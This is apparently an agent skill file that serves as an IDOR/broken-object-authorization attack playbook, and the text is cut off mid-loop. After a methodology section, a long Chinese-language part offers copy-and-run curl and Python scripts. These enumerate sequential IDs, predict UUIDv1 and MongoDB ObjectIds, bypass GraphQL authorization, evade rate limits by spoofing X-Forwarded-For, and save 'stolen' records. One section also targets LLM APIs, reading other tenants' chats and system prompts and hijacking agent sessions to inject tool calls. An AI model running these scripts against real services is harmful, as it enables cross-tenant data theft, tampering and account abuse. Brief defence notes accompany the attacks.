---
name: idor-broken-object-authorization
description: >-
  IDOR and broken object authorization testing playbook. Use when requests expose object identifiers, tenant boundaries, writable fields, or missing object-level authorization checks.
---

# SKILL: IDOR / Broken Object Level Authorization — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: IDOR is the #1 bug bounty finding. This skill covers non-obvious IDOR surfaces, all attack vectors (not just URL params), A-B testing methodology, BOLA vs BFLA distinction, chaining IDOR to higher impact, and what testers repeatedly miss.

---

## 1. IDOR vs BOLA vs BFLA

| Term | Meaning | Impact |
|---|---|---|
| IDOR | Insecure Direct Object Reference | Read/modify other users' data |
| BOLA | Broken Object Level Authorization (OWASP API Top 10 A1) | Same as IDOR, API terminology |
| BFLA | Broken Function Level Authorization | Low-priv user accesses HIGH-PRIV functions (e.g., admin endpoints) |

**Key distinction**: 
- BOLA = accessing **object** you shouldn't own (data belonging to other users)
- BFLA = accessing **function** you shouldn't be authorized for (admin CRUD operations, bulk actions, user management)

---

## 2. WHERE TO FIND OBJECT IDs (ALL LOCATIONS)

Don't stop at URL path parameters — IDs appear in:

```
URL path:        GET /api/v1/users/1234/profile
URL query:       GET /orders?order_id=982
Request body:    {"userId": 1234, "action": "view"}
JSON fields:     {"resource": {"id": 5678, "type": "invoice"}}
Headers:         X-User-ID: 1234
                 X-Account-ID: 9999
Cookies:         user_id=1234; account=org_5678
GraphQL args:    query { user(id: "1234") { ... } }
Form fields:     <input name="documentId" value="5678">
WebSocket msgs:  {"event":"subscribe","channel_id":9999}
```

---

## 3. A-B TESTING METHODOLOGY

The most systematic IDOR test approach:

```
Step 1: Create two test accounts: UserA and UserB
Step 2: Perform all actions as UserA, capture all requests
        (profile edit, order view, password change, file access, etc.)
Step 3: Note every object ID created or accessed by UserA
Step 4: Authenticate as UserB
Step 5: Replay UserA's requests using UserB's session token
Step 6: If UserB can read/modify UserA's data → BOLA confirmed

Victim matters: for real bugs, target existing users, not test accounts.
Report evidence: show UserA owns the resource, UserB accessed it.
```

---

## 4. ID TYPE ITS IMPLICATIONS

| ID Pattern | Example | Notes |
|---|---|---|
| Sequential int | `id=1001` → `id=1002` | Easy prediction, high hit rate |
| UUID v4 | `550e8400-...` | Need to find UUID from other endpoints |
| UUID v1 | Clock-based UUID | Time-predictable! Extract timestamp/MAC |
| GUIDs from own data | See in responses | Collect all UUIDs from your own account data first |
| Hashed IDs | `md5(user_id)` | Try hashing sequential ints |
| Encoded IDs | base64(`{"id":1001}`) | Decode → modify → re-encode |
| Compound IDs | `/api/users/1/orders/5` | Both IDs may be independently verifiable |

---

## 5. HORIZONTAL vs VERTICAL PRIVILEGE ESCALATION

**Horizontal**: UserA accesses UserB's data (same privilege level)
```
GET /api/account/1234/statement     ← you are user 5678
```

**Vertical**: Low-priv user accesses admin-only functions
```
POST /api/admin/users/delete        ← normal user calling admin endpoint
GET /api/admin/all-users
PUT /api/users/1234/role {"role":"admin"}
```

**Combined**: Low-priv IDOR that grants privilege escalation
```
GET /api/v1/users/1/details → read admin user's auth token
```

---

## 6. HTTP METHOD ESCALATION

When `GET /resource/1234` is properly restricted, test ALL other verbs:

```http
GET    /api/v1/users/UserA_ID    ← might be blocked
POST   /api/v1/users/UserA_ID    ← different code path, might not check authz
PUT    /api/v1/users/UserA_ID    ← update another user's data
DELETE /api/v1/users/UserA_ID    ← delete another user's account
PATCH  /api/v1/users/UserA_ID    ← partial update (often missed in authz checks)
```

**Why this works**: Authorization logic is often implemented per-method, and developers forget edge cases.

---

## 7. PARAMETER POLLUTION & TYPE CONFUSION

When `id=1234` is validated, try:
```
id[]=1234&id[]=5678          ← array — app may use first or last
id=5678&id=1234              ← duplicate — app may prefer first or last
{"id": "1234"}               ← string vs int: might hit different code path
{"id": [1234]}               ← array in JSON
{"userId": 1234, "id": 5678} ← two ID fields — which is used for authz?
```

**JSON Type Confusion**:
```json
{"userId": "1234"}   vs   {"userId": 1234}
```
Some ORMs handle string vs integer differently in queries.

---

## 8. BFLA (FUNCTION LEVEL) ATTACKS

### Common BFLA Endpoints to Test

```http
# User management (admin-only in design):
GET /api/v1/admin/users
DELETE /api/v1/users/{any_user_id}
PUT /api/v1/users/{user_id}/role

# Bulk operations:
POST /api/v1/users/bulk-delete
GET /api/v1/export/all-data

# Billing/payment admin:
POST /api/v1/admin/subscription/modify
GET /api/v1/admin/payments/all

# Internal reporting:
GET /api/v1/reports/all-users-activity
```

### How to Find Hidden Admin Endpoints
1. Read JS bundles — admin routes often exposed in frontend code
2. Look at API docs (Swagger/OpenAPI) for "admin", "internal", "privileged" tags
3. Enumerate `/api/v1/admin/**`, `/api/v1/manage/**`, `/api/v1/internal/**`
4. Burp "Discover Content" on API base path
5. Compare regular user docs vs admin section docs if available

---

## 9. INDIRECT IDOR (REFERENCE CHAIN)

App checks permission on **object A** but doesn't check ownership of **referenced object B**:

**Example**:
```
UserA has permission to read their own messages.
GET /api/messages/1234 → checks: "does user own message 1234?" ✓

But: messages have attachments.
GET /api/attachments/5678 → doesn't check: "does attachment belong to message owned by user?"
```

Test: access attachments/sub-resources directly via their IDs without going through parent endpoint.

**GraphQL variant**: Inline querying related objects without separate authorization:
```graphql
query {
  myProfile {
    followers {
      privateEmail    ← accessing private field of OTHER users via relationship
    }
  }
}
```

---

## 10. MASS ASSIGNMENT → PRIVILEGE ESCALATION

When POST/PUT takes a JSON body, properties in the underlying model may be settable even if not in the official API docs:

```json
POST /api/v1/register
{
  "username": "attacker",
  "email": "a@evil.com",
  "password": "password",
  "role": "admin",          ← hidden field
  "isAdmin": true,          ← hidden field
  "verified": true,         ← skip email verification
  "creditBalance": 9999     ← give self credits
}
```

**How to find hidden fields**:
1. Intercept admin "create user" vs normal "register" — diff the fields
2. Read API documentation for all possible fields
3. Check source code if available (GitHub, JS bundles)
4. Fuzz with Burp: add common property names and check for `200` vs `400`

---

## 11. STATE MACHINE ABUSE (BUSINESS LOGIC IDOR)

When resources have a status/state:
```
order.status: pending → confirmed → shipped → delivered
```

Test: Can you skip states?
```
PUT /api/orders/1234 {"status": "delivered"}  ← from "pending"
PUT /api/orders/1234 {"status": "refunded"}   ← from "pending" (skip shipped)
```

Can you set another user's order status?
```
PUT /api/orders/UserA_order_id {"status": "cancelled"}  ← as UserB
```

---

## 12. QUICK IDOR CHECKLIST

```
□ Create 2 accounts (UserA + UserB)
□ Map all API calls that contain object IDs (Burp History export filter)
□ Test all HTTP verbs on each endpoint
□ Test ID in all locations: path, body, header, query, cookie
□ Try sequential IDs (−1, +1 from your own)
□ Try UUIDs/GUIDs collected from your own account data
□ Test sub-resources (attachments, comments, transactions)
□ Test admin endpoints directly (BFLA)
□ Test POST/PUT body for extra fields (mass assignment)
□ Compare JSON response field count vs documented fields (hidden fields)
□ Test state/status field modification
```

---

## 13. SYSTEMATIC IDOR TESTING — 8 CATEGORIES

| # | Category | Test Method |
|---|---|---|
| 1 | Direct ID reference | Change numeric/UUID ID in URL: `/api/users/123` → `/api/users/124` |
| 2 | Predictable UUID | If UUIDs are v1 (time-based), adjacent IDs are calculable |
| 3 | Batch/bulk operations | `/api/users/bulk?ids=123,456` — add other users' IDs |
| 4 | Export/download | Export endpoint leaks other users' data: `/export?user_id=*` |
| 5 | Linked object IDOR | Change `order.address_id` to another user's address |
| 6 | Resource replacement | Update own profile with another user's resource ID → overwrites |
| 7 | Write IDOR | PUT/PATCH/DELETE with other user's ID — modify/delete their data |
| 8 | Nested object | `/api/orgs/1/users/2` — change org ID to access other org's users |

### Testing Flow

```
1. Create two test accounts (A and B)
2. Perform all CRUD operations as A, capture all request IDs
3. Replay each request replacing A's IDs with B's IDs
4. Check: Can A read B's data? Modify? Delete?
5. Test with: numeric IDs, UUIDs, slugs, encoded values
6. Test across: URL path, query params, JSON body, headers
```

---

## 14. ORM FILTER CHAIN LEAKS

### Django ORM Filter Injection

```python
# Vulnerable: User.objects.filter(**request.data)
# Attacker sends: {"password__startswith": "a"}
# Django translates to: WHERE password LIKE 'a%'

# Character-by-character extraction:
POST /api/users/
{"username": "admin", "password__startswith": "a"}   → 200 (match)
{"username": "admin", "password__startswith": "b"}   → 404 (no match)
# Iterate through charset for each position

# Relational traversal:
{"author__user__password__startswith": "a"}
# Traverses: Author → User → password field

# On MySQL: ReDoS via regex
{"email__regex": "^(a+)+$"}  → CPU spike if match exists
```

### Prisma Filter Injection

```json
// Vulnerable: prisma.user.findMany({ where: req.body })
// Attacker sends nested include/select:
{
  "include": {
    "posts": {
      "include": {
        "author": {
          "select": {"password": true}
        }
      }
    }
  }
}
// Leaks password field through relation traversal
```

### Ransack (Ruby on Rails)

```
# Ransack allows search predicates via query params:
GET /users?q[password_cont]=admin
# Searches: WHERE password LIKE '%admin%'

# Character extraction:
GET /users?q[password_start]=a   → count results
GET /users?q[password_start]=ab  → narrow down
# Tool: plormber (automated Ransack extraction)
```

---

## 15. 2026 EMERGING TECHNIQUES

### 15.1 LLM / AI API IDOR (2026)

LLM platforms expose object IDs that developers treat as "internal" but ship in client APIs. Any holder of a valid API key can frequently enumerate every other tenant's data because the authorization check is "valid key" not "key owns object."

| ID type | Endpoint pattern | Exploitation |
|---|---|---|
| `conversation_id` | `GET /v1/conversations/{conversation_id}/messages` | enumerate UUIDs/ints → read any user's chat history, system prompts, PII |
| `message_id` | `GET /v1/messages/{message_id}` | read individual messages across tenants |
| `collection_id` (vector DB) | `POST /v1/vector/collections/{collection_id}/query` | cross-tenant vector reads; leak embedded source docs |
| `document_id` (RAG) | `GET /v1/documents/{document_id}` | enumerate RAG source documents (contracts, internal wikis) |
| `agent_session_id` | `WS /v1/agents/{session_id}` | hijack another user's running agent session — inject tool calls |

**Conversation enumeration** — IDs are often sequential ints or UUIDv1 (time-predictable, Section 4):

```http
GET /v1/conversations/10042/messages HTTP/1.1
Authorization: Bearer sk-ATTACKER_KEY
```

```json
{ "data": [ { "role":"user","content":"Summarize my contract with Acme..." },
             { "role":"assistant","content":"...SSN 123-45-..." } ],
  "owner": "user_victim_7813" }
```

The fix gap: the API trusts that a *valid* key implies ownership of *any* conversation. Test by creating two keys (org A / org B) and cross-reading — the A-B methodology from Section 3, lifted to API keys as the identity axis.

**Agent session hijack**: `agent_session_id` is frequently returned in a connect handshake and never re-validated per message. Connecting to another user's session over WebSocket injects the attacker as a co-speaker, letting them trigger the victim's configured tools (cross-link ../ai-llm-attack-surface/SKILL.md).

### 15.2 API Version & Channel IDOR Drift (2026)

IDOR fixes rarely propagate across versions and channels:

- **v1 still vulnerable after v2 fix**: `GET /api/v2/orders/{id}` gets per-object authz; `GET /api/v1/orders/{id}` is left alive for "legacy mobile" and never patched. Always test every version prefix (`v1`,`v2`,`v3`, and unversioned `/api/orders/`).
- **Mobile vs Web divergence**: mobile endpoints (`/api/mobile/v1/orders/{id}`) frequently reuse the v1 (unpatched) authz layer while the web uses v2.

| Channel / version | Authz | Test |
|---|---|---|
| `/api/v2/orders/{id}` | per-object owner check | baseline |
| `/api/v1/orders/{id}` | none (legacy) | IDOR |
| `/api/mobile/v1/orders/{id}` | none | IDOR |
| `/api/internal/orders/{id}` | none (trusted-network assumed) | IDOR if reachable |

### 15.3 GraphQL Nested IDOR (2026)

GraphQL authorization is usually enforced at the **top-level resolver** and forgotten on nested fields. Relationship traversal leaks private fields of other users without ever calling a top-level `user(id=OTHER)`:

```graphql
query {
  myProfile {                 # top-level: authorized to MY profile
    orders {                  # my orders
      items {
        seller {              # relationship crosses tenant boundary
          email               # private field of ANOTHER user
          phone
          paymentMethods { last4 }
        }
      }
    }
  }
}
```

- Top-level `myProfile` → owner-checked (safe)
- Nested `seller.email` → resolver returns the related object with no per-field authz → leaks

**Edge / indirect reference bypass**: relay-style global IDs `node(id: "USER_9999")` frequently bypass the `user(id)` top-level guard entirely because the `node` interface resolver applies only type-level, not field-level, authorization.

```graphql
query { node(id: "VXNlcjo5OTk5") {  # base64("User:9999")
    ... on User { email ssn orders { total } } } }
```

### 15.4 Batch / Bulk Endpoint IDOR (2026)

Bulk endpoints accept arrays and validate the **request**, not each element:

```http
GET /api/v1/export?ids=1001,1002,1003,1004,1005 HTTP/1.1
```

The export handler authorizes "can this user call /export" but iterates `ids` without an owner check per ID → cross-tenant data export. Mix one owned ID (to pass any sanity check) with victim IDs.

**GraphQL batching IDOR**: a single POST with N queries, each fetching a different victim's object, slips past per-query rate limits and per-object checks applied only to the first query:

```json
[
  {"query":"{ order(id:1001){ total } }"},
  {"query":"{ order(id:1002){ total } }"},
  {"query":"{ order(id:9999){ total } }"}
]
```

### 15.5 Soft-Delete Object IDOR (2026)

"Deleted" objects are soft-deleted (`deleted_at` set) and excluded from normal queries, but still loadable by ID. Access them via:

- explicit flag: `GET /api/v1/orders/1001?include_deleted=true`
- relationship chain: a live object references a soft-deleted one — `GET /api/v1/invoices/55` → `order.deleted_at` populated but `order` still returned with full PII
- admin/internal variant: `/api/internal/orders/1001?with_trashed=1` (Laravel `withTrashed` leak)

Soft-deleted records often contain GDPR-"erased" data — high impact / low effort.

### 15.6 IDOR + Race Condition (TOCTOU) (2026)

Authorization check and resource access are two queries with a window between them. Fire concurrent requests that flip ownership mid-flight:

```
T0  attacker: PUT /api/v1/docs/1001 {owner: attacker}   ← own it (allowed)
T1  attacker: 20x parallel GET /api/v1/docs/1001
T2  attacker: PUT /api/v1/docs/1001 {owner: victim}     ← give it back
```

If `GET` caches the owner at authz-time but reads content at access-time, a request that passed authz under attacker-ownership returns content after ownership flipped back to victim — or the inverse, where a request authorized under victim-ownership is serviced with attacker-injected content. Single-byte timing differentials are enough; use 20–50 parallel threads (Turbo Intruder `engine=concurrent`).

### 15.7 Payment Callback IDOR (2026)

Payment gateway callbacks identify the order by an ID the gateway echoes back. If that ID is reusable across gateways or not bound to the issuing merchant, replay/swap succeeds:

**CVE-2026-41432** — cross-gateway `trade_no` reuse. A callback `trade_no` issued by gateway A was accepted by gateway B's notify endpoint because both used the same `trade_no` format and B only checked "is this trade_no unpaid in MY ledger?" not "did MY gateway issue it?". An attacker pays the cheap amount on gateway A, then fires A's `trade_no` at B's callback URL to mark a larger order paid.

```http
POST /api/payment/notify HTTP/1.1   # gateway B's notify endpoint
trade_no=20260414A0001&status=success&amount=0.01
# B looks up trade_no in its ledger → not found → some installs CREATE it as paid
# OR B reuses A's trade_no format → finds the victim's unpaid order → marks paid
```

Test: obtain a `trade_no` from any gateway/merchant, fire it at every notify endpoint you can find; check signature binding (or lack thereof) to the issuing gateway.

### 15.8 2026 IDOR Checklist

```
□ LLM APIs: enumerate conversation_id/message_id/collection_id/document_id/agent_session_id with a 2nd key
□ Test agent_session_id WebSocket hijack (inject tool calls into victim session)
□ Test /api/v1 (and /api/mobile/v1, /api/internal) after v2 is patched
□ GraphQL: traverse nested relationships from myProfile → other users' private fields
□ GraphQL: test node(id) relay global-ID bypass of top-level user() authz
□ Batch endpoints: /export?ids=own,victim,... ; GraphQL query batching arrays
□ Soft-delete: ?include_deleted=true, with_trashed, relationship-chain to deleted objects
□ TOCTOU: concurrent ownership-flip GETs (Turbo Intruder, 20-50 threads)
□ Payment: replay trade_no across gateway notify endpoints; verify CVE-2026-41432 binding
□ Re-run A-B methodology with API keys as the identity axis
```

---

## PRACTICAL ATTACK CHAINS (2026)

> 以下为 2026 年实战中高频出现的 4 条完整 IDOR/BOLA 攻击链,包含可直接运行的 curl/python/bash 命令、分步利用、检测绕过技巧与真实 CVE 引用。所有代码注释为中文,即拷即用。

### 攻击链 1: REST API 顺序 ID 枚举型 IDOR

**目标画像**: REST API 使用顺序整数 ID(`/api/v1/users/{id}`),仅校验"是否已认证"不校验"是否拥有该对象"。
**CVE 参考**: CVE-2026-41432(2026 年支付回调 trade_no 跨网关重用,本质为对象引用未隔离)。

**步骤 1 - A-B 账户对照建立基线**:
```bash
# 创建两个测试账户 UserA 和 UserB, 获取各自的 API token
TOKEN_A="Bearer eyJ...A..."
TOKEN_B="Bearer eyJ...B..."

# UserA 创建资源(如订单), 记录资源 ID
curl -sk -X POST "https://api.target.com/v1/orders" \
  -H "Authorization: ${TOKEN_A}" -H "Content-Type: application/json" \
  -d '{"product":"test","amount":100}'
# 响应: {"id": 10042, "product":"test", "amount":100, "owner":"userA"}
# 记录: order_id=10042

# UserA 正常访问自己的订单
curl -sk "https://api.target.com/v1/orders/10042" -H "Authorization: ${TOKEN_A}"
# 200 + 订单数据
```

**步骤 2 - 跨账户 IDOR 验证(核心)**:
```bash
# UserB 尝试访问 UserA 的订单(关键: 换 token 但保持相同 order_id)
curl -sk "https://api.target.com/v1/orders/10042" -H "Authorization: ${TOKEN_B}"
# 若返回 200 + UserA 的订单数据 -> IDOR 确认

# 测试相邻 ID(顺序枚举)
for id in 10040 10041 10042 10043 10044 10045; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://api.target.com/v1/orders/${id}" -H "Authorization: ${TOKEN_B}")
  echo "$code  order_id=${id}"
done
# 200 表示该 ID 可被任意已认证用户访问
```

**步骤 3 - 批量数据窃取(枚举所有订单)**:
```python
#!/usr/bin/env python3
# 文件名: idor_enum.py
# IDOR 批量枚举 - 顺序 ID 遍历窃取数据
import requests, json, time
import urllib3
urllib3.disable_warnings()

TOKEN = "Bearer eyJ...ATTACKER_TOKEN..."
BASE = "https://api.target.com/v1/orders"

stolen = []
# 遍历 ID 范围(根据步骤 2 确定的有效范围)
for order_id in range(10000, 10100):
    r = requests.get(f"{BASE}/{order_id}", 
                     headers={"Authorization": TOKEN}, verify=False, timeout=5)
    if r.status_code == 200:
        data = r.json()
        stolen.append(data)
        print(f"[+] 窃取订单 {order_id}: {data.get('owner','?')} - {data.get('amount','?')}")
    elif r.status_code == 429:
        time.sleep(2)  # 遇到限速时休眠
        continue
    # 添加延迟避免触发 WAF
    time.sleep(0.1)

# 保存窃取的数据
with open('/tmp/stolen_orders.json', 'w') as f:
    json.dump(stolen, f, indent=2, ensure_ascii=False)
print(f"[+] 共窃取 {len(stolen)} 个订单, 已保存到 /tmp/stolen_orders.json")
```

**步骤 4 - HTTP 方法升级与写 IDOR**:
```bash
# GET 被防护? 尝试其他方法(写 IDOR)
# PUT 修改受害者订单(篡改金额/地址)
curl -sk -X PUT "https://api.target.com/v1/orders/10042" \
  -H "Authorization: ${TOKEN_B}" -H "Content-Type: application/json" \
  -d '{"amount":1,"address":"attacker_address"}'
# 若返回 200 -> 写 IDOR(可篡改他人数据)

# PATCH 部分更新(常被遗漏的鉴权)
curl -sk -X PATCH "https://api.target.com/v1/orders/10042" \
  -H "Authorization: ${TOKEN_B}" -H "Content-Type: application/json" \
  -d '{"status":"refunded"}'
# 将受害者订单标记为已退款

# DELETE 删除受害者资源
curl -sk -X DELETE "https://api.target.com/v1/orders/10042" \
  -H "Authorization: ${TOKEN_B}"
```

**步骤 5 - 检测绕过技巧**:
```bash
# 绕过 1: 参数污染(应用可能取第一个或最后一个 ID)
curl -sk "https://api.target.com/v1/orders/10042?order_id=99999" -H "Authorization: ${TOKEN_B}"
# 或 JSON body 中双 ID:
# {"orderId": 10042, "id": 99999}

# 绕过 2: 类型混淆(字符串 vs 整数, ORM 处理不同)
curl -sk "https://api.target.com/v1/orders/10042" -H "Authorization: ${TOKEN_B}"  # 整数
# vs POST body: {"id": "10042"}  # 字符串

# 绕过 3: 批量端点绕过(校验请求但不校验每个元素)
curl -sk "https://api.target.com/v1/orders/export?ids=10042,10043,10044" -H "Authorization: ${TOKEN_B}"

# 绕过 4: 限速绕过 - 轮换 X-Forwarded-For
curl -sk "https://api.target.com/v1/orders/10042" \
  -H "Authorization: ${TOKEN_B}" -H "X-Forwarded-For: 1.2.3.4"
```

**防御要点**: 每个对象访问必须校验"当前用户是否拥有该对象";使用不可预测的 ID(UUID);所有 HTTP 方法统一鉴权;批量端点逐元素校验。

---

### 攻击链 2: UUID/GUID 预测型 IDOR

**目标画像**: API 使用 UUID v1(基于时间)或可预测的 GUID,攻击者可计算相邻 UUID。
**CVE 参考**: 2026 年 LLM API 中 conversation_id 使用 UUIDv1 被预测枚举(见技能 15.1 节)。

**步骤 1 - 收集 UUID 并分析版本**:
```bash
# UserA 的 API 返回中包含多个 UUID, 收集它们
curl -sk "https://api.target.com/v1/profile" -H "Authorization: ${TOKEN_A}" | jq '.id, .orders[].id, .documents[].id'
# 输出示例:
# "550e8400-e29b-11d4-a716-446655440000"  <- UUID v1(注意第三段以 1 开头)

# 判断 UUID 版本: 第三段以 1 开头 = UUID v1(基于时间, 可预测!)
# UUID v1 结构: time_low-time_mid-version-clock_seq-node(MAC)
```

**步骤 2 - 提取时间戳预测相邻 UUID**:
```python
#!/usr/bin/env python3
# 文件名: uuid_predict.py
# UUID v1 时间戳提取与相邻 UUID 预测
import uuid, time, requests, urllib3
urllib3.disable_warnings()

# 已知 UUID v1(从目标 API 收集)
known_uuid = "550e8400-e29b-11d4-a716-446655440000"
u = uuid.UUID(known_uuid)
print(f"版本: v{u.version}")
print(f"时间戳(Gregorian): {u.time}")
print(f"时钟序列: {u.clock_seq}")
print(f"节点(MAC): {hex(u.node)}")

# UUID v1 时间戳是 100ns 间隔(从 1582-10-15 起)
# 相邻创建的对象时间戳接近 -> UUID 可预测
# 提取时间戳范围, 生成可能的相邻 UUID
base_time = u.time
TOKEN = "Bearer eyJ...ATTACKER_TOKEN..."

# 生成时间戳范围内的 UUID(±10000 个 100ns 周期 ≈ ±1ms)
stolen = []
for offset in range(-5000, 5000):
    predicted_time = base_time + offset
    # 构造预测 UUID(保持 clock_seq 和 node 不变)
    predicted = uuid.UUID(fields=(
        predicted_time & 0xFFFFFFFF,
        (predicted_time >> 32) & 0xFFFF,
        ((predicted_time >> 48) & 0x0FFF) | 0x1000,  # version 1
        u.clock_seq_hi_variant,
        u.clock_seq_low,
        u.node
    ))
    # 尝试访问预测的 UUID
    r = requests.get(f"https://api.target.com/v1/documents/{predicted}",
                     headers={"Authorization": TOKEN}, verify=False, timeout=3)
    if r.status_code == 200:
        data = r.json()
        stolen.append(data)
        print(f"[+] 命中! UUID={predicted}, 数据={str(data)[:100]}")

print(f"[+] 共预测命中 {len(stolen)} 个对象")
```

**步骤 3 - MongoDB ObjectId 预测**:
```python
#!/usr/bin/env python3
# 文件名: objectid_predict.py
# MongoDB ObjectId 预测(4字节时间戳 + 5字节随机 + 3字节计数器)
import requests, struct, urllib3
urllib3.disable_warnings()

# 已知 ObjectId(从 API 收集)
known_oid = "507f1f77bcf86cd799439011"
# 解析: 前4字节=时间戳, 中5字节=随机值, 后3字节=计数器
ts = int(known_oid[:8], 16)
random_part = known_oid[8:18]
counter = int(known_oid[18:24], 16)
print(f"时间戳: {ts} ({time.ctime(ts)})")
print(f"随机部分: {random_part}")
print(f"计数器: {counter}")

# 相邻 ObjectId: 时间戳接近 + 相同随机部分 + 计数器递增
TOKEN = "Bearer eyJ...ATTACKER_TOKEN..."
for c in range(counter - 50, counter + 50):
    if c < 0:
        c = c + 0x1000000  # 计数器回绕
    predicted = f"{ts:08x}{random_part}{c:06x}"
    r = requests.get(f"https://api.target.com/v1/documents/{predicted}",
                     headers={"Authorization": TOKEN}, verify=False, timeout=3)
    if r.status_code == 200:
        print(f"[+] 命中! ObjectId={predicted}, 数据={r.text[:100]}")
```

**步骤 4 - 检测绕过技巧**:
```bash
# 绕过 1: 从其他端点收集 UUID(列表/搜索/导出)
curl -sk "https://api.target.com/v1/users/search?q=a" -H "Authorization: ${TOKEN_A}" | jq '.[].id'
# 搜索接口可能泄露其他用户的 UUID

# 绕过 2: 从公开资源收集(分享链接/公开文档)
# https://target.com/share/550e8400-e29b-11d4-a716-446655440000

# 绕过 3: 利用 base64 编码的 ID(解码后是 JSON)
echo "eyJpZCI6MTAwNDJ9" | base64 -d  # {"id":10042}
# 修改后重新编码: echo -n '{"id":99999}' | base64
```

**防御要点**: 使用 UUID v4(随机, 不可预测);即使 UUID 不可预测也必须做对象级鉴权;避免在搜索/列表端点泄露其他用户 ID。

---

### 攻击链 3: GraphQL 嵌套对象 IDOR

**目标画像**: GraphQL API 仅在顶层 resolver 做鉴权,嵌套字段(关系遍历)无对象级鉴权。
**CVE 参考**: 2026 年 GraphQL nested authorization 缺陷趋势(见技能 15.3 节)。

**步骤 1 - 发现嵌套关系泄露**:
```bash
# 正常查询: 查询自己的 profile(顶层有鉴权)
curl -sk -X POST "https://api.target.com/graphql" \
  -H "Authorization: ${TOKEN_A}" -H "Content-Type: application/json" \
  -d '{"query":"query { myProfile { id name email } }"}'
# 200 + 自己的数据

# 嵌套查询: 通过关系遍历到其他用户(关键: 嵌套字段无鉴权)
curl -sk -X POST "https://api.target.com/graphql" \
  -H "Authorization: ${TOKEN_A}" -H "Content-Type: application/json" \
  -d '{"query":"query { myProfile { orders { items { seller { email phone paymentMethods { last4 } } } } } }"}'
# myProfile 顶层鉴权通过(查自己的 profile)
# 但 orders.items.seller 跨越用户边界 -> 泄露其他用户(卖家)的 email/phone/支付信息
```

**步骤 2 - node(id) relay 全局 ID 绕过**:
```bash
# GraphQL relay 的 node(id) 接口通常仅做类型级鉴权, 不做字段级
# 构造全局 ID(base64 编码的 "User:9999")
VICTIM_GLOBAL_ID=$(echo -n "User:9999" | base64)  # VXNlcjo5OTk5

curl -sk -X POST "https://api.target.com/graphql" \
  -H "Authorization: ${TOKEN_A}" -H "Content-Type: application/json" \
  -d "{\"query\":\"query { node(id: \\\"${VICTIM_GLOBAL_ID}\\\") { ... on User { id email phone ssn orders { total } } } }\"}"
# node() 接口绕过 user(id) 顶层的鉴权 -> 直接读取任意用户数据

# 枚举全局 ID(递增 User ID)
for uid in $(seq 1 100); do
  GID=$(echo -n "User:${uid}" | base64)
  curl -sk -X POST "https://api.target.com/graphql" \
    -H "Authorization: ${TOKEN_A}" -H "Content-Type: application/json" \
    -d "{\"query\":\"query { node(id: \\\"${GID}\\\") { ... on User { email } } }\"}" \
    | jq -r '.data.node.email // empty'
done
```

**步骤 3 - 批量查询 IDOR(GraphQL batching)**:
```python
#!/usr/bin/env python3
# 文件名: graphql_batch_idor.py
# GraphQL 批量查询绕过单查询限速 + 对象级鉴权
import requests, json, urllib3
urllib3.disable_warnings()

TOKEN = "Bearer eyJ...ATTACKER_TOKEN..."
URL = "https://api.target.com/graphql"

# 单个 POST 发送 N 个查询, 每个查不同用户的对象
# 绕过: 1) 单查询限速 2) 鉴权仅检查第一个查询
queries = []
for uid in range(1, 50):
    queries.append({"query": f"{{ user(id: {uid}) {{ id email phone }} }}"})

# GraphQL batching(数组形式)
r = requests.post(URL,
    headers={"Authorization": TOKEN, "Content-Type": "application/json"},
    json=queries,  # 数组形式 = 批量查询
    verify=False)

results = r.json()
for i, res in enumerate(results):
    if res.get('data', {}).get('user'):
        print(f"[+] 泄露用户 {i+1}: {res['data']['user'].get('email')}")
```

**步骤 4 - 检测绕过技巧**:
```bash
# 绕过 1: 别名查询(同一字段用不同别名查不同 ID, 绕过字段级鉴权)
curl -sk -X POST "https://api.target.com/graphql" \
  -H "Authorization: ${TOKEN_A}" -H "Content-Type: application/json" \
  -d '{"query":"query { u1: user(id:1){email} u2: user(id:2){email} u3: user(id:3){email} }"}'

# 绕过 2: 分片(fragment)隐藏嵌套字段
curl -sk -X POST "https://api.target.com/graphql" \
  -H "Authorization: ${TOKEN_A}" -H "Content-Type: application/json" \
  -d '{"query":"query { myProfile { ...adminFields } } fragment adminFields on User { email role permissions { canDeleteAll } }"}'

# 绕过 3: 内省(introspection)发现隐藏字段/类型
curl -sk -X POST "https://api.target.com/graphql" \
  -H "Authorization: ${TOKEN_A}" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' | jq '.data.__schema.types[].fields[].name'
```

**防御要点**: GraphQL 每个 resolver(含嵌套字段)都需对象级鉴权;禁用/限制 node(id) 接口;限制批量查询;关闭内省。

---

### 攻击链 4: 2026 - AI 模型 API 预测端点 IDOR

**目标画像**: LLM/RAG API 的预测(predit/inference)端点使用 conversation_id/document_id,仅校验 API key 有效不校验对象归属。
**CVE 参考**: CVE-2026-49813(MCP server + LLM API 对象级鉴权缺失);2026 年 AI API IDOR 高发趋势。

**步骤 1 - 发现 AI API 对象 ID**:
```bash
# 攻击者创建对话, 获取 conversation_id
curl -sk -X POST "https://api.target.com/v1/chat/completions" \
  -H "Authorization: Bearer sk-ATTACKER_KEY" -H "Content-Type: application/json" \
  -d '{"model":"gpt-4","messages":[{"role":"user","content":"hello"}]}'
# 响应包含: {"id":"chatcmpl-10042", "conversation_id":"conv_a1b2c3d4"}

# 列出自己的对话历史
curl -sk "https://api.target.com/v1/conversations/conv_a1b2c3d4/messages" \
  -H "Authorization: Bearer sk-ATTACKER_KEY"
# 200 + 自己的对话

# 关键检测: conversation_id 是顺序整数还是 UUID?
# 若为顺序整数(conv_10042) -> 可枚举
```

**步骤 2 - 跨租户对话历史窃取**:
```python
#!/usr/bin/env python3
# 文件名: ai_api_idor.py
# AI API 对话历史 IDOR - 跨租户窃取 PII/system prompt
import requests, urllib3, time
urllib3.disable_warnings()

KEY = "Bearer sk-ATTACKER_KEY..."  # 攻击者的 API key
BASE = "https://api.target.com/v1"

# 场景: conversation_id 为顺序整数, API 仅校验 key 有效性不校验归属
stolen = []
for cid in range(10000, 10100):
    r = requests.get(f"{BASE}/conversations/{cid}/messages",
                     headers={"Authorization": KEY}, verify=False, timeout=5)
    if r.status_code == 200:
        data = r.json()
        stolen.append({"conv_id": cid, "data": data})
        # 泄露内容可能包含: 对话历史、系统提示词、PII(SSN/合同信息)
        content = str(data)[:200]
        print(f"[+] 窃取对话 {cid}: {content}")
    elif r.status_code == 429:
        time.sleep(2)
        continue
    time.sleep(0.1)

# 也测试其他 AI 对象端点
for endpoint in ["documents", "collections", "agents/sessions"]:
    for oid in range(1, 20):
